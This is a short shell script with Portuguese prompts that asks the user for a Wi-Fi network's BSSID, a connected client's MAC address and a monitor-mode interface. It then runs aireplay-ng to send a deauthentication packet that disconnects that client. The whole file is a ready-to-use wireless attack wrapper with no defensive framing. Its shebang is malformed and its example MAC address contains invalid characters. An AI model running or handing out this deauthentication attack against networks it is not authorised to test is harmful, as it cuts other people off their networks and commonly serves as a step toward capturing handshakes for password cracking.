#/bin/sh

echo  "BSSID = (voce pode encontra-lo quando esta usando o airodump-ng)"
echo "MAC do client = (esse é o 'MAC do dispositivo conectado na rede' voce pode encontralo no canto esquerdo do lado do BSSID da rede exemplo tem 5 dispositvos na rede, apareceram 5 MAC diferente como esse 12:OL:JH:3D:87:0B)"
 
echo "qual o BSSID?:"
read bssid

echo "qual o MAC do client"
read mc

echo "como esta sua interface em modo monitor?:"
read monitor

aireplay-ng -0 1 -a $bssid  -c  $mc  $monitor
